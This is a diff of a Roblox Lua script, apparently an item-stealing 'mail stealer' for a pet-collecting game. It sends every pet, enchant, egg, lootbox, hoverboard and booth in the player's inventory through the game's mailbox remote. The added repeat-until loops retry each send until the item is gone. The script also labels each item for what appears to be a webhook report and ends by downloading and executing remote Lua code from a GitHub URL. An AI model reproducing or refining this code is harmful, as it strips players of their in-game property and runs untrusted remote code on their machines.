@@ -149,7 +149,9 @@ for i, v in pairs(inv.Pet) do
             [4] = i,
             [5] = v._am or 1
         }
-        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+        repeat
+            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+	    until not inv.Pet[i]
         _G.image = dir.thumbnail
         _G.type = "Shiny Rainbow 💎🌈"
         wait(0.5)
@@ -173,6 +175,9 @@ for i, v in pairs(inv.Pet) do
             [5] = v._am or 1
         }
         game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+	    repeat
+            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+	    until not inv.Pet[i]
         _G.image = dir.goldenThumbnail
         _G.type = "Shiny Golden 💎🥇"
         wait(0.5)
@@ -195,7 +200,9 @@ for i, v in pairs(inv.Pet) do
             [4] = i,
             [5] = v._am or 1
         }
-        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+	    repeat
+            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+	    until not inv.Pet[i]
         _G.image = dir.thumbnail
         _G.type = "Rainbow 🌈"
         wait(0.5)
@@ -219,7 +226,9 @@ for i, v in pairs(inv.Pet) do
             [4] = i,
             [5] = v._am or 1
         }
-        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+	    repeat
+            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+	    until not inv.Pet[i]
         _G.image = dir.goldenThumbnail
         _G.type = "Shiny 💎"
         wait(0.5)
@@ -242,7 +251,9 @@ for i, v in pairs(inv.Pet) do
             [4] = i,
             [5] = v._am or 1
         }
-        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+	    repeat
+            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+	    until not inv.Pet[i]
         _G.image = dir.goldenThumbnail
         _G.type = "Golden 🥇"
         wait(0.5)
@@ -263,7 +274,9 @@ for i, v in pairs(inv.Enchant) do
             [4] = i,
             [5] = v._am or 1
         }
-        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+	    repeat
+            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+	    until not inv.Enchant[i]
         directory = library.Directory.Enchants[id]
         _G.type = "Not a Pet"
         _G.image = directory.Icon(1)
@@ -288,7 +301,9 @@ if inv.Ultimate then
                 [4] = i,
                 [5] = v._am or 1
             }
-            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+            repeat
+        	    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+		    until not inv.Ultimate[i]
             _G.image = dir.Icon
             _G.type = "Not a Pet"
             wait(0.5)
@@ -312,7 +327,9 @@ for i, v in pairs(inv.Pet) do
             [4] = i,
             [5] = v._am or 1
         }
-        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+	    repeat
+            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+	    until not inv.Pet[i]
         _G.image = dir.thumbnail
         _G.type = "Normal 🚽"
         wait(0.5)
@@ -334,7 +351,9 @@ for i, v in pairs(inv.Egg) do
         [4] = i,
         [5] = v._am or 1
     }
-    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+    repeat
+        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+	until not inv.Egg[i]
     _G.image = dir.icon
     _G.type = "Not a Pet"
     wait(0.5)
@@ -353,7 +372,9 @@ for i, v in pairs(inv.Enchant) do
             [4] = i,
             [5] = v._am or 1
         }
-        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+        repeat
+            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+        until not inv.Enchant[i]
         directory = library.Directory.Enchants[id]
         _G.image = directory.Icon(1)
         _G.type = "Not a Pet"
@@ -379,7 +400,9 @@ if inv.Lootbox then
                 [4] = i,
                 [5] = v._am or 1
             }
-            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+            repeat
+                game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+            until not inv.Lootbox[i]
             _G.image = dir.Icon
             _G.type = "Not a Pet"
             wait(0.5)
@@ -401,7 +424,9 @@ if inv.Lootbox then
                 [4] = i,
                 [5] = v._am or 1
             }
-            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+            repeat
+                game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+            until not inv.Lootbox[i]
             _G.image = dir.Icon
             _G.type = "Not a Pet"
             wait(0.5)
@@ -422,7 +447,9 @@ for i, v in pairs(inv.Hoverboard) do
             [4] = i,
             [5] = v._am or 1
         }
-        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+        repeat
+            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+        until not inv.Hoverboard[i]
         directory = library.Directory.Hoverboards[id]
         _G.image = directory.Icon
         wait(0.5)
@@ -442,7 +469,9 @@ for i, v in pairs(inv.Booth) do
             [4] = i,
             [5] = v._am or 1
         }
-        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+        repeat
+            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+        until not inv.Booth[i]
         directory = library.Directory.Booths[id]
         _G.image = directory.Icon
         wait(0.5)
@@ -466,8 +495,11 @@ for i, v in pairs(inv.Pet) do
             [4] = i,
             [5] = v._am or 1
         }
-        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+        repeat
+            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+        until not inv.Pet[i]
         _G.image = dir.thumbnail
+        _G.type = "Normal"
         if v.pt and v.pt == 1 then
             _G.image = dir.goldenThumbnail
             _G.type = "Golden 🥇"
@@ -496,8 +528,11 @@ for i, v in pairs(inv.Pet) do
             [4] = i,
             [5] = v._am or 1
         }
-        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+        repeat
+            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+        until not inv.Pet[i]
         _G.image = dir.thumbnail
+        _G.type = "Normal"
         if v.pt and v.pt == 1 then
             _G.image = dir.goldenThumbnail
             _G.type = "Golden"
@@ -512,3 +547,4 @@ for i, v in pairs(inv.Pet) do
         loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/WebhookSystem.lua'))()
     end
 end
+
